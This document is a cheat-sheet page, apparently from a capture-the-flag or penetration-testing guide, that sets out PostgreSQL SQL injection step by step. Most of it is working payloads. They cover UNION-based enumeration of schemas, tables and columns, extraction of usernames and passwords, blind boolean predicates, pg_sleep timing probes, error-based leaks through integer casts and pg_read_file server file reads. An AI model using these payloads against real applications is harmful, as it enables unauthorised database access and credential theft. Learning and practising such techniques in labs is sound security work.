---
title: "03 · SQLi — PostgreSQL"
weight: 12
bookToc: true
---

# PostgreSQL SQLi

**Flow:** `version()` → database/schema → tables → columns → text-cast data. Start with [SQLi](../sqli/) if the insertion context is not yet confirmed.

## 1. Identify engine and context

Example input: three-column UNION, second column accepts text.

```sql
missing' UNION SELECT NULL,version(),NULL-- -
missing' UNION SELECT NULL,current_database()||':'||current_schema()||':'||current_user,NULL-- -
```

PostgreSQL is strict about UNION types. A text expression in an integer slot fails even if the injection itself works. Try each position with NULL elsewhere; cast retrieved values with `::text`, but do not expect a cast to repair an incompatible original UNION column type.

## 2. Enumerate schemas and tables

Standalone query fragments:

```sql
SELECT schema_name FROM information_schema.schemata ORDER BY schema_name;

SELECT table_schema,table_name
FROM information_schema.tables
WHERE table_schema NOT IN ('pg_catalog','information_schema')
ORDER BY table_schema,table_name;
```

Complete single-slot payload:

```sql
missing' UNION SELECT NULL,string_agg(table_schema||'.'||table_name,','),NULL FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')-- -
```

The app's tables need not be in `public`. Qualify names with the discovered schema.

## 3. Enumerate columns

```sql
SELECT column_name,data_type
FROM information_schema.columns
WHERE table_schema='public' AND table_name='users'
ORDER BY ordinal_position;
```

```sql
missing' UNION SELECT NULL,string_agg(column_name||':'||data_type,',' ORDER BY ordinal_position),NULL FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -
```

## 4. Read rows

```sql
SELECT id,username,password FROM public.users ORDER BY id;
SELECT flag FROM public.flags;
SELECT concat_ws(':',id::text,username,password) FROM public.users ORDER BY id LIMIT 1 OFFSET 0;
```

```sql
missing' UNION SELECT NULL,string_agg(concat_ws(':',id::text,username,password),'|'),NULL FROM public.users-- -
```

`||` concatenates strings but a NULL operand yields NULL. Use `COALESCE(value,'<NULL>')` when needed. Names created with quoted mixed case require exact double quotes: `public."SecretFlags"`.

## 5. Blind predicates

```sql
length(current_database())>5
substring(current_database(),1,1)='c'
ascii(substring(current_database(),1,1))>109
EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='public' AND table_name='flags')
ascii(substring((SELECT flag FROM public.flags ORDER BY id LIMIT 1),1,1))>109
```

For byte-level work, `encode(convert_to(value,'UTF8'),'hex')` yields text hex. `length(text)` counts characters.

## 6. Conditional delay

`pg_sleep()` returns void; do not copy MySQL's `AND SLEEP(...)` directly.

These numeric-context probes make a scalar subquery that returns integer 1:

```sql
1 AND (SELECT 1 FROM pg_sleep(CASE WHEN 1=1 THEN 2 ELSE 0 END))=1
1 AND (SELECT 1 FROM pg_sleep(CASE WHEN 1=2 THEN 2 ELSE 0 END))=1
1 AND (SELECT 1 FROM pg_sleep(CASE WHEN ascii(substring(current_database(),1,1))>109 THEN 2 ELSE 0 END))=1
```

If stacked statements are accepted by the driver:

```sql
1'; SELECT pg_sleep(2)-- -
```

A blocked second statement does not rule out SQLi. Use the scalar form or a boolean oracle instead.

## 7. Detailed error oracle

Where database exception details are exposed, forcing text into an integer may reveal the text:

```sql
1 AND CAST((SELECT current_database()) AS integer)=1
```

The error can include `invalid input syntax for type integer: "..."`. If the value is valid numeric text, conversion succeeds; prefix a marker in a suitable subquery if needed. A generic error page provides only an error/no-error signal.

## 8. File read is privileged

```sql
SELECT pg_read_file('/flag.txt',0,4096);
```

Availability depends on the function grants, server-file roles, superuser status, and path restrictions. This is a server-side file, not necessarily the web container's file. Prefer catalog/data reads before assuming server file access.

Official references: [system information](https://www.postgresql.org/docs/current/functions-info.html), [information schema](https://www.postgresql.org/docs/current/information-schema.html), [string functions](https://www.postgresql.org/docs/current/functions-string.html), [server file functions](https://www.postgresql.org/docs/current/functions-admin.html).
